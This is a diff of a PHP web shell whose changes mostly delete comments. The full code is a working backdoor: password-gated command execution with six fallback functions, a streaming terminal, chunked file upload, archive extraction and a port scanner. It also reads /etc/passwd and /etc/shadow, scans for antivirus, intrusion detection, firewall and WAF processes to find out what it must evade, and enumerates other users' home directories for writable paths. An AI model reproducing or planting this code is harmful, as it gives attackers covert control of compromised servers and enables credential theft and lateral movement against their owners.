@@ -7,10 +7,8 @@ error_reporting(E_ALL);
 ini_set('display_errors', 0);
 set_time_limit(0);
 
-// Default password hash using MD5 for 'myp@ssw0rd'
 $default_password_hash = '2ebba5cd75576c408240e57110e7b4ff';
 
-// --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
 $WHITELISTED_IPS = array();
 $WHITELISTED_USER_AGENTS = array();
 
@@ -21,7 +19,6 @@ if (!empty($WHITELISTED_IPS) && !in_array($_SERVER['REMOTE_ADDR'], $WHITELISTED_
 }
 
 if (!empty($WHITELISTED_USER_AGENTS)) {
-    // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
     $currentUserAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
     $uaMatch = false;
     foreach ($WHITELISTED_USER_AGENTS as $ua) {
@@ -101,12 +98,6 @@ if ($authenticated && isset($_GET['action_get'])) {
     }
 }
 
-/**
- * Checks if a function exists and is not disabled in php.ini.
- *
- * @param string $function_name The name of the function to check.
- * @return bool True if the function is callable, false otherwise.
- */
 function is_callable_shell_func($function_name) {
     if (!function_exists($function_name)) {
         return false;
@@ -121,26 +112,16 @@ function is_callable_shell_func($function_name) {
     return true;
 }
 
-/**
- * Executes a shell command using a fallback mechanism to find an available execution function.
- * Tries functions in the order of: proc_open, popen, shell_exec, system, passthru, exec.
- *
- * @param string $command The command to execute.
- * @return string The output of the command.
- */
 function execute_command_with_fallback($command) {
     $full_command_redirect = $command . ' 2>&1';
 
-    // Priority 1: proc_open (more control)
     if (is_callable_shell_func('proc_open')) {
-        // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
         $descriptorspec = array(
-           0 => array("pipe", "r"),  // stdin
-           1 => array("pipe", "w"),  // stdout
-           2 => array("pipe", "w")   // stderr
+           0 => array("pipe", "r"),
+           1 => array("pipe", "w"),
+           2 => array("pipe", "w")
         );
         $pipes = array();
-        // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
         $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
         $process = @proc_open($command, $descriptorspec, $pipes, $cwd);
         if (is_resource($process)) {
@@ -154,7 +135,6 @@ function execute_command_with_fallback($command) {
         }
     }
 
-    // Priority 2: popen
     if (is_callable_shell_func('popen')) {
         $handle = @popen($full_command_redirect, 'r');
         if ($handle) {
@@ -167,7 +147,6 @@ function execute_command_with_fallback($command) {
         }
     }
 
-    // Priority 3: shell_exec
     if (is_callable_shell_func('shell_exec')) {
         $output = @shell_exec($full_command_redirect);
         if ($output !== null) {
@@ -175,7 +154,6 @@ function execute_command_with_fallback($command) {
         }
     }
 
-    // Priority 4: system (captures output buffer)
     if (is_callable_shell_func('system')) {
         ob_start();
         @system($full_command_redirect, $return_var);
@@ -184,7 +162,6 @@ function execute_command_with_fallback($command) {
         return $output;
     }
 
-    // Priority 5: passthru (captures output buffer)
     if (is_callable_shell_func('passthru')) {
         ob_start();
         @passthru($full_command_redirect, $return_var);
@@ -193,7 +170,6 @@ function execute_command_with_fallback($command) {
         return $output;
     }
 
-    // Priority 6: exec
     if (is_callable_shell_func('exec')) {
         $output_array = array();
         @exec($full_command_redirect, $output_array, $return_var);
@@ -203,12 +179,6 @@ function execute_command_with_fallback($command) {
     return "[Error] All command execution backends (proc_open, popen, shell_exec, system, passthru, exec) are disabled or failed.";
 }
 
-/**
- * Executes a shell command and streams the output in real-time.
- * Used for the terminal to prevent timeouts on long-running commands.
- *
- * @param string $command The command to execute.
- */
 function stream_command($command) {
     if (function_exists('apache_setenv')) {
         @apache_setenv('no-gzip', 1);
@@ -220,13 +190,11 @@ function stream_command($command) {
     header('Content-Type: text/plain; charset=utf-8');
     header('X-Content-Type-Options: nosniff');
 
-    // proc_open is the best choice for real-time I/O
     if (is_callable_shell_func('proc_open')) {
-        // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
         $descriptorspec = array(
-           0 => array("pipe", "r"),  // stdin
-           1 => array("pipe", "w"),  // stdout
-           2 => array("pipe", "w")   // stderr
+           0 => array("pipe", "r"),
+           1 => array("pipe", "w"),
+           2 => array("pipe", "w")
         );
         $pipes = array();
         $process = @proc_open($command, $descriptorspec, $pipes, $_SESSION['terminal_cwd']);
@@ -269,7 +237,6 @@ function stream_command($command) {
         }
     }
 
-    // Fallback to popen
     if (is_callable_shell_func('popen')) {
         $handle = @popen($command . ' 2>&1', 'r');
         if ($handle) {
@@ -283,20 +250,10 @@ function stream_command($command) {
         }
     }
 
-    // If no streaming available, use blocking method
     echo execute_command_with_fallback($command);
     flush();
 }
 
-/**
- * Reassembles a file from chunks uploaded to a temporary directory.
- *
- * @param string $upload_id The unique ID for the upload.
- * @param string $original_filename The final name of the file.
- * @param int $total_chunks The total number of chunks.
- * @param string $target_dir The directory to save the final file in.
- * @return bool|string True on success, error message string on failure.
- */
 function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $target_dir) {
     $temp_upload_dir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'pv-shell-uploads';
     $chunk_dir = $temp_upload_dir . DIRECTORY_SEPARATOR . $upload_id;
@@ -311,7 +268,7 @@ function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $ta
         $chunk_path = $chunk_dir . DIRECTORY_SEPARATOR . $i;
         if (!file_exists($chunk_path)) {
             fclose($out_handle);
-            @unlink($final_path); // Clean up partial file
+            @unlink($final_path);
             return "Reassembly failed: Missing chunk #" . $i;
         }
         $in_handle = @fopen($chunk_path, 'rb');
@@ -320,11 +277,11 @@ function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $ta
         }
         stream_copy_to_stream($in_handle, $out_handle);
         fclose($in_handle);
-        @unlink($chunk_path); // Clean up chunk
+        @unlink($chunk_path);
     }
 
     fclose($out_handle);
-    @rmdir($chunk_dir); // Clean up chunk dir
+    @rmdir($chunk_dir);
     return true;
 }
 
@@ -332,11 +289,9 @@ function command_exists($command) {
     if (!is_callable_shell_func('shell_exec')) { return false; }
     $safe_command = escapeshellarg($command);
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        // 'where' is more reliable than 'command -v' on Windows
         $result = @shell_exec("where " . $command . " 2> NUL");
         return !empty($result);
     } else {
-        // 'command -v' is the POSIX standard
         $result = @shell_exec("command -v " . $safe_command . " 2>/dev/null");
         return !empty($result);
     }
@@ -614,15 +569,9 @@ function do_dns_lookup($host) {
     return $output;
 }
 
-/**
- * Generates breadcrumb data for a given path.
- *
- * @param string $path The file path.
- * @return array An array of breadcrumb segments.
- */
 function generate_breadcrumbs($path) {
     $breadcrumbs = array();
-    $path = rtrim(str_replace('\\', '/', $path), '/'); // Normalize to forward slashes
+    $path = rtrim(str_replace('\\', '/', $path), '/');
     $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
     $current_path_builder = '';
 
@@ -696,7 +645,6 @@ function getServerInfoDetails() {
         $info['User Info (posix)'] = ($userInfo ? $userInfo['name'] : 'N/A') . ' (UID: ' . $UID . ', GID: ' . ($userInfo ? $userInfo['gid'] : posix_getgid()) . ')';
     }
 
-    // --- START: MODIFIED/ENHANCED Features ---
     if (!$is_windows) {
         $passwd_path = '/etc/passwd';
         $info['Readable /etc/passwd'] = @is_readable($passwd_path) ?
@@ -712,7 +660,6 @@ function getServerInfoDetails() {
         $info['Readable /etc/shadow'] = 'N/A (Linux specific)';
     }
 
-    // Dynamic "Downloaders" Scan
     $found_downloaders = array();
     $downloader_cmds = array('wget', 'curl', 'fetch', 'lynx', 'links', 'aria2c');
     foreach ($downloader_cmds as $cmd) { if (command_exists($cmd)) $found_downloaders[] = $cmd; }
@@ -720,31 +667,23 @@ function getServerInfoDetails() {
     if (extension_loaded('curl')) $found_downloaders[] = 'PHP: cURL';
     $info['Downloaders'] = !empty($found_downloaders) ? implode(', ', $found_downloaders) : 'None found';
     
-    // Dynamic "Useful" Scan
     $found_useful = array();
     $useful_cmds = array('gcc', 'g++', 'make', 'git', 'svn', 'htop', 'iotop', 'python', 'perl', 'ruby', 'node', 'java', 'tar', 'unzip', 'zip', 'gzip', 'bzip2', 'locate', 'nmap', 'masscan', 'sqlmap', 'socat', 'netcat', 'nc', 'docker', 'kubectl');
     $package_managers = array('apt', 'yum', 'apk', 'pacman', 'dnf');
     foreach (array_merge($useful_cmds, $package_managers) as $cmd) { if (command_exists($cmd)) $found_useful[] = $cmd; }
     $info['Useful'] = !empty($found_useful) ? implode(', ', $found_useful) : 'None found';
     
-    // Dynamic "Danger" (Security) Scan
     $found_danger = array();
     if (!$is_windows && is_callable_shell_func('shell_exec')) {
         $ps_output = @shell_exec('ps aux');
         $dmesg_output = @shell_exec('dmesg');
         
         $danger_keywords = array(
-            // AV
             'clamd', 'clamav', 'freshclam', 'avg', 'kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'sophos',
-            // Rootkit
             'rkhunter', 'chkrootkit',
-            // HIDS/NIDS
             'ossec', 'wazuh', 'tripwire', 'aide', 'snort', 'suricata', 'bro', 'zeek',
-            // Firewall
             'iptables', 'ufw', 'firewalld', 'ipfw', 'shorewall', 'portsentry',
-            // Hardening
             'fail2ban', 'denyhosts', 'lidsadm', 'grsecurity', 'pax', 'selinux', 'apparmor',
-            // Log Analysis
             'logwatch', 'logcheck'
         );
         foreach ($danger_keywords as $keyword) { if (stripos($ps_output, $keyword) !== false) $found_danger[] = $keyword . ' (process)'; }
@@ -757,7 +696,6 @@ function getServerInfoDetails() {
         if (@is_readable('/etc/chkrootkit.conf')) $found_danger[] = 'chkrootkit (config)';
         if (@is_dir('/var/ossec') || @is_dir('/etc/ossec')) $found_danger[] = 'ossec/wazuh (config)';
         
-        // WAF Check
         if (function_exists('apache_get_modules') && in_array('mod_security2', apache_get_modules())) {
             $found_danger[] = 'mod_security (Apache)';
         } elseif (command_exists('httpd') && stripos(@shell_exec('httpd -M 2>/dev/null'), 'security2_module') !== false) {
@@ -768,7 +706,6 @@ function getServerInfoDetails() {
     }
     if (extension_loaded('suhosin')) $found_danger[] = 'suhosin (PHP)';
     $info['Danger'] = !empty($found_danger) ? implode(', ', array_unique($found_danger)) : 'None detected';
-    // --- END: MODIFIED/ENHANCED Features ---
 
     $safe_mode_val = ini_get('safe_mode');
     if(is_string($safe_mode_val) && strtolower($safe_mode_val) === "off") $safe_mode_val = 0;
@@ -858,7 +795,6 @@ function formatSizeUnits($bytes) {
     return @round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
 }
 
-// --- Jumping Feature Functions ---
 function getJumpingUsernames() {
     $passwd_file = '/etc/passwd';
     $usernames = array();
@@ -936,21 +872,10 @@ function scanJumpingDirectories() {
     return $results_html;
 }
 
-// --- Uncompressor Feature Functions ---
-/**
- * Uncompresses an archive file (zip, rar, tar, 7z).
- *
- * @param string $source The full path to the source archive file (e.g., the temp path for uploads).
- * @param string $destination The full path to the destination directory.
- * @param string $original_filename The original name of the file, used for extension checking.
- * @return array A result array with 'status' and 'message'.
- */
 function uncompress_archive($source, $destination, $original_filename) {
-    // Security: Prevent directory traversal for destination.
     $real_base_path = realpath(__DIR__);
     $real_dest_path = realpath($destination);
 
-    // If destination doesn't exist, its real path is false. In that case, check its parent.
     if ($real_dest_path === false) {
         $real_dest_path = realpath(dirname($destination));
     }
@@ -959,7 +884,6 @@ function uncompress_archive($source, $destination, $original_filename) {
         return array('status' => 'error', 'message' => "Invalid destination path or access denied. Destination must be within the script's directory.");
     }
     
-    // Create destination directory if it doesn't exist
     if (!is_dir($destination) && !@mkdir($destination, 0755, true)) {
         return array('status' => 'error', 'message' => "Could not create destination directory '" . htmlspecialchars($destination) . "'.");
     }
@@ -980,7 +904,6 @@ function uncompress_archive($source, $destination, $original_filename) {
                     $status = 'success';
                 } else { throw new Exception("Failed to open ZIP archive."); }
             } elseif (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && command_exists('tar')) {
-                // Fallback for Windows: use built-in tar command which can handle .zip
                 $cmd = "tar -xf " . escapeshellarg($source) . " -C " . escapeshellarg($destination);
                 $output = execute_command_with_fallback($cmd);
                 $message = "Successfully attempted to uncompress ZIP via tar command '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
@@ -1138,7 +1061,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             
             if (!@chdir($fm_path)) {
                 $response['message'] = 'Could not access path: ' . htmlspecialchars($fm_path);
-                $response['path'] = htmlspecialchars($fm_path); // Return the failed path
+                $response['path'] = htmlspecialchars($fm_path);
                 $response['breadcrumbs'] = generate_breadcrumbs($fm_path);
                 $response['drives'] = $drives;
                 $response['ds'] = DIRECTORY_SEPARATOR;
@@ -1307,19 +1230,16 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $isSystemFile = in_array($rawPath, array('/etc/passwd', '/etc/shadow'));
 
                 if ($isSystemFile) {
-                    // For specific system files, we don't use realpath to avoid issues with open_basedir
-                    // but we still check if it's a file and readable.
                     if (is_file($rawPath) && is_readable($rawPath)) {
                         $filePath = $rawPath;
                     } else {
                          $response['message'] = '[Error] System file not found or not readable: ' . htmlspecialchars($rawPath);
                     }
                 } else {
-                    // For all other files, use realpath for security (prevents directory traversal)
                     $filePath = realpath($rawPath);
                     if (!$filePath || !is_file($filePath) || !is_readable($filePath)) {
                          $response['message'] = '[Error] File not found, not a file, or not readable: ' . htmlspecialchars($rawPath);
-                         $filePath = ''; // unset filePath to prevent further processing
+                         $filePath = '';
                     }
                 }
 
@@ -1330,7 +1250,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     } else {
                         $final_content = $content;
                         if (function_exists('mb_convert_encoding')) {
-                            // Try to convert to UTF-8, but don't fail if it's not valid.
                             $final_content = mb_convert_encoding($content, 'UTF-8', mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
                         }
                         
@@ -1341,7 +1260,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                         }
                     }
                 }
-                // If filePath is empty, the error message has already been set.
 
             } else {
                 $response['message'] = '[Error] No file path provided.';
@@ -1353,7 +1271,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $filePath = $_POST['path'];
                 $dirPath = dirname($filePath);
                  
-                // Allow saving only within the script's directory for safety
                 $real_base_path = realpath(__DIR__);
                 $real_file_path = realpath($filePath);
                 $real_dir_path = $real_file_path ? dirname($real_file_path) : realpath($dirPath);
@@ -1439,7 +1356,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 break;
             }
 
-            $upload_id = basename($_POST['upload_id']); // Sanitize
+            $upload_id = basename($_POST['upload_id']);
             $chunk_dir = $temp_upload_dir . DIRECTORY_SEPARATOR . $upload_id;
             if (!is_dir($chunk_dir) && !@mkdir($chunk_dir, 0755, true)) {
                 $response['message'] = '[Error] Could not create temporary chunk directory.';
@@ -1448,7 +1365,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             
             $chunk_index = (int)$_POST['chunk_index'];
             $total_chunks = (int)$_POST['total_chunks'];
-            $original_filename = basename($_POST['original_filename']); // Sanitize
+            $original_filename = basename($_POST['original_filename']);
 
             $chunk_path = $chunk_dir . DIRECTORY_SEPARATOR . $chunk_index;
             if (@move_uploaded_file($_FILES['chunk']['tmp_name'], $chunk_path)) {
@@ -1616,10 +1533,9 @@ if ($authenticated && isset($_POST['ajax_action'])) {
         case 'uncompress_file':
             $final_source = '';
             $original_filename = '';
-            $temp_source_to_delete = null; // To keep track of any file we create that needs manual deletion.
+            $temp_source_to_delete = null;
             $upload_error_code = isset($_FILES['compressed_file']) ? $_FILES['compressed_file']['error'] : UPLOAD_ERR_NO_FILE;
             
-            // Default response
             $response = array('status' => 'error', 'message' => 'Please either upload a file or specify a valid local file path.');
 
             if (isset($_POST['local_file']) && !empty(trim($_POST['local_file']))) {
@@ -1642,19 +1558,16 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $ext = strtolower(pathinfo($original_filename, PATHINFO_EXTENSION));
                 $secondary_ext = strtolower(pathinfo(pathinfo($original_filename, PATHINFO_FILENAME), PATHINFO_EXTENSION));
 
-                // Fix for PharData on Linux uploads, which requires a file with the correct extension.
                 if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN' && ((in_array($ext, array('gz', 'bz2')) && $secondary_ext === 'tar') || $ext === 'tar')) {
                     $new_temp_path = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . uniqid('phar-temp_') . '_' . basename($original_filename);
                     if (move_uploaded_file($uploaded_tmp_path, $new_temp_path)) {
                         $final_source = $new_temp_path;
-                        $temp_source_to_delete = $new_temp_path; // Mark this new file for deletion
+                        $temp_source_to_delete = $new_temp_path;
                     } else {
                          $response['message'] = 'Could not move uploaded file to a temporary location for processing.';
-                         $final_source = ''; // Prevent further processing
+                         $final_source = '';
                     }
                 } else {
-                    // For ZIP, RAR, 7z, and TAR on Windows, the original temp file is fine.
-                    // PHP will clean this temp file up automatically after the script ends.
                     $final_source = $uploaded_tmp_path;
                 }
             } elseif ($upload_error_code !== UPLOAD_ERR_NO_FILE) {
@@ -1673,7 +1586,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $destination = isset($_POST['destination']) && !empty($_POST['destination']) ? rtrim($_POST['destination'], '/\\') : '.';
                 $response = uncompress_archive($final_source, $destination, $original_filename);
                 
-                // Clean up our manually created temporary file, if it exists.
                 if ($temp_source_to_delete && is_file($temp_source_to_delete)) {
                     @unlink($temp_source_to_delete);
                 }
@@ -1817,7 +1729,6 @@ endif;
         .modal-message.success { background-color: #050; color: #0f0; border: 1px solid #0a0;}
         .modal-message.error { background-color: #500; color: #f00; border: 1px solid #a00;}
         select.inputz { width: auto; min-width: 218px;}
-        /* --- Upload Progress Bar Styles --- */
         #upload-progress-container { width: 100%; max-height: 400px; overflow-y: auto; padding-right: 10px; }
         .upload-progress-item { margin-bottom: 15px; }
         .upload-progress-item .filename { word-break: break-all; font-size: 0.9em; margin-bottom: 5px; }
@@ -1825,11 +1736,9 @@ endif;
         .upload-progress-bar { background-color: #0ff; height: 15px; border-radius: 3px; width: 0%; transition: width 0.2s ease-out; }
         .upload-progress-info { font-size: 0.8em; margin-top: 3px; display: flex; justify-content: space-between; }
         .upload-progress-info .status { color: #0cc; }
-        /* --- Jumping Tab Styles --- */
         #jumping-results { background: #000; color: #fff; padding: 15px; min-height: 200px; max-height: 350px; overflow-y: scroll; border: 1px solid #055; margin-top: 20px; white-space: pre-wrap; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; border-radius: 5px; }
         #jumping-results:empty::before { content: "Scan results will appear here..."; color: #555; }
         .jumping-writable { color: #00ff00; } .jumping-readable { color: #ffffff; } .jumping-error { color: #ff4444; }
-        /* --- Uncompressor Styles --- */
         .uncompressor-sub-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
         .uncompressor-sub-tab { padding: 8px 12px; cursor: pointer; border: 1px solid #077; background: #222; color: #0aa; border-radius: 5px; }
         .uncompressor-sub-tab:hover, .uncompressor-sub-tab.active { background: #000; color: #0ff; border-color: #0ff; }
@@ -2073,9 +1982,9 @@ endif;
             </div>
         </div>
     </div>
-    <script>
+
+<script>
 document.addEventListener('DOMContentLoaded', function() {
-    // --- Element Selectors ---
     const tabs = document.querySelectorAll('.tab-link');
     const contents = document.querySelectorAll('.tab-content');
     const terminalOutput = document.getElementById('terminal-output');
@@ -2107,8 +2016,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const uncompressorFileInput = document.getElementById('uncompressor-file-input');
     const uncompressorLocalPathInput = document.getElementById('uncompressor-local-path');
 
-
-    // --- State Variables ---
     const scriptHomeDirectory = '<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
     const initialFileManagerPath = '<?php echo addslashes(htmlspecialchars($fileManagerInitialPath)); ?>';
     const terminalCwdFromServer = '<?php echo addslashes(htmlspecialchars(isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd())); ?>';
@@ -2119,7 +2026,6 @@ document.addEventListener('DOMContentLoaded', function() {
     let historyIndex = -1;
     let isCommandRunning = false;
     
-    // --- Utility Functions ---
     function htmlEntities(str) {
         return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
     }
@@ -2133,7 +2039,6 @@ document.addEventListener('DOMContentLoaded', function() {
         return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
     }
 
-    // --- Modal Management ---
     function showModalMessage(message, type = 'success') {
         fileModalMessage.textContent = message;
         fileModalMessage.className = `modal-message ${type}`;
@@ -2144,7 +2049,6 @@ document.addEventListener('DOMContentLoaded', function() {
         fileModalMessage.classList.add('hidden');
     }
 
-    // --- Custom Alert ---
     function showCustomAlert(message, type = 'info', duration = 3000) {
         const alertBox = document.createElement('div');
         Object.assign(alertBox.style, {
@@ -2164,7 +2068,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }, duration);
     }
 
-    // --- Tab Management ---
     function setActiveTab(tabId) {
         tabs.forEach(t => t.classList.remove('active'));
         contents.forEach(c => c.classList.remove('active'));
@@ -2182,15 +2085,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 fetchFiles(currentFileManagerPath);
             }
         } else {
-            setActiveTab('terminal'); // Default to terminal if invalid tabId
+            setActiveTab('terminal');
         }
     }
     tabs.forEach(tab => tab.addEventListener('click', function() { setActiveTab(this.dataset.tab); }));
     const lastTabId = localStorage.getItem('activeShellTab');
     setActiveTab(lastTabId || 'terminal');
 
-
-    // --- Core AJAX Function ---
     async function sendAjaxRequest(action, data = {}, isUpload = false) {
         const formData = isUpload ? data : new FormData();
         if (!isUpload) {
@@ -2208,7 +2109,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
                 throw new Error(errorText || `HTTP error ${response.status}`);
             }
-            // Check if response is empty before trying to parse
             const responseText = await response.text();
             if (!responseText) {
                  return { status: 'error', message: 'AJAX request returned an empty response from server.' };
@@ -2223,7 +2123,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // --- Terminal Logic ---
     function setCommandRunning(running) {
         isCommandRunning = running;
         commandInput.disabled = running;
@@ -2298,7 +2197,7 @@ document.addEventListener('DOMContentLoaded', function() {
             const reader = response.body.getReader();
             const decoder = new TextDecoder();
             while (true) {
-                if (isCommandRunning === false) { // Check if abort was clicked
+                if (isCommandRunning === false) {
                     reader.cancel();
                     break;
                 }
@@ -2331,7 +2230,7 @@ document.addEventListener('DOMContentLoaded', function() {
         if (!isCommandRunning) return;
         terminalAbortBtn.disabled = true;
         const result = await sendAjaxRequest('abort_command');
-        setCommandRunning(false); // Manually set state to false to stop stream reader
+        setCommandRunning(false);
         appendToTerminalOutput(result.message || 'Abort signal sent.', 'info');
         terminalAbortBtn.disabled = false;
     });
@@ -2356,12 +2255,10 @@ document.addEventListener('DOMContentLoaded', function() {
         appendToTerminalOutput("", 'prompt');
     }
 
-    // --- File Manager Logic ---
     async function fetchFiles(path) {
         fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center;">Loading files for ${htmlEntities(path)}...</td></tr>`;
         const result = await sendAjaxRequest('get_file_listing', { path: path });
 
-        // Update Nav
         driveListContainer.innerHTML = ''; breadcrumbContainer.innerHTML = '';
         if (result.path) pathInput.value = result.path;
         if (result.drives && result.drives.length > 0) {
@@ -2388,7 +2285,6 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         }
 
-        // Update File List
         fileListingBody.innerHTML = '';
         if (result.status === 'success') {
             if (!result.files || result.files.length === 0) {
@@ -2457,7 +2353,6 @@ document.addEventListener('DOMContentLoaded', function() {
     pathInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') navigateToInputPath(); });
     document.getElementById('file-manager-home-btn').addEventListener('click', () => fetchFiles(scriptHomeDirectory));
 
-    // --- File Operations ---
     window.openModalWithFile = (filePath, fileName) => {
         currentEditingFile = filePath;
         const isSystemFile = filePath === '/etc/passwd' || filePath === '/etc/shadow';
@@ -2529,7 +2424,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // --- Chunked File Upload Logic ---
     fileUploadBtn.addEventListener('click', () => fileUploadInput.click());
     if(closeUploadModalBtn) {
         closeUploadModalBtn.addEventListener('click', () => {
@@ -2578,7 +2472,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     async function uploadFileInChunks(file, progressItem) {
         return new Promise((resolve, reject) => {
-            const chunkSize = 2 * 1024 * 1024; // 2MB chunks
+            const chunkSize = 2 * 1024 * 1024;
             const totalChunks = Math.ceil(file.size / chunkSize);
             const uploadId = progressItem.dataset.uploadId;
             let chunkIndex = 0;
@@ -2655,8 +2549,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-
-    // --- Network Tools ---
     const networkResultsArea = document.getElementById('network-results-area');
     async function sendNetworkRequest(formId, sub_action, data, isForeground = false) {
         networkResultsArea.innerHTML = `Executing${isForeground ? ' (page may hang)' : ''}... <i class="fas fa-spinner fa-spin"></i>`;
@@ -2685,7 +2577,6 @@ document.addEventListener('DOMContentLoaded', function() {
         sendNetworkRequest(e.target.id, 'port_scan', data);
     });
 
-    // --- Jumping Feature Logic ---
     startJumpingScanBtn.addEventListener('click', async () => {
         jumpingResultsDiv.innerHTML = 'Scanning... <i class="fas fa-spinner fa-spin"></i>';
         startJumpingScanBtn.disabled = true;
@@ -2698,7 +2589,6 @@ document.addEventListener('DOMContentLoaded', function() {
         startJumpingScanBtn.disabled = false;
     });
 
-    // --- Uncompressor Feature Logic ---
     uncompressorSubTabs.forEach(tab => {
         tab.addEventListener('click', () => {
             uncompressorSubTabs.forEach(t => t.classList.remove('active'));
@@ -2717,7 +2607,7 @@ document.addEventListener('DOMContentLoaded', function() {
         e.preventDefault();
         uncompressorResults.innerHTML = 'Processing... <i class="fas fa-spinner fa-spin"></i>';
         const formData = new FormData(uncompressorForm);
-        formData.append('ajax_action', 'uncompress_file'); // Fix: Manually add ajax_action for upload requests
+        formData.append('ajax_action', 'uncompress_file');
 
         const result = await sendAjaxRequest('uncompress_file', formData, true);
 
@@ -2739,8 +2629,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-
-    // Initial Load
     if (document.getElementById('filemanager').classList.contains('active')) {
          fetchFiles(currentFileManagerPath);
     }
